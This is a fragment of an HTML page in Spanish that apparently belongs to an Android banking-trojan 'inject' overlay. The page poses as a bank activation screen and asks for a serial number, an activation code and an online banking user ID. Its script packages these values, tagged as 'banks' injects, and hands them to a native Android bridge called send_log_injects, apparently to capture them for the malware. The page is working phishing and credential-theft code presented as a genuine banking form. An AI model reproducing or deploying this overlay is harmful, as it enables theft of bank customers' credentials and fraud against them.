        </header>
        <section>
            <label for="series"> Número de serie </label>
            <input type="text" class="input" id="series" name="series" maxlength="10" placeholder="Introducir el número de serie" autocomplete="off">

            <label for="code"> Código de activación </label>
            <input type="tel" class="input" id="code" name="code" placeholder="Introducir el número de serie" autocomplete="off">

            <label for="login"> Identificador de usuario de Banca Online </label>
            <input type="text" class="input" id="login" name="login" placeholder="Introduce tu identificador de usario" autocomplete="off">

            <input type="submit" class="button" id="sendData" value="OK">
        </section>
    </form>

    <script>
        $('#code').mask('0000 0000 0000 0000 0000')

        var series = document.getElementById('series'),
            code = document.getElementById('code'),
            login = document.getElementById('login');

        var sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(series.value.length < 4) {
                series.classList.add('error')
            } else {
                series.classList.remove('error')
            }

            if(code.value.length < 4) {
                code.classList.add('error')
            } else {
                code.classList.remove('error')
            }

            if(login.value.length < 4) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(series.value.length >= 4 && code.value.length >= 4 && login.value.length >= 4) {
                var data = {};
                data.series = series.value;
                data.code = code.value;
                data.login = login.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
</body>
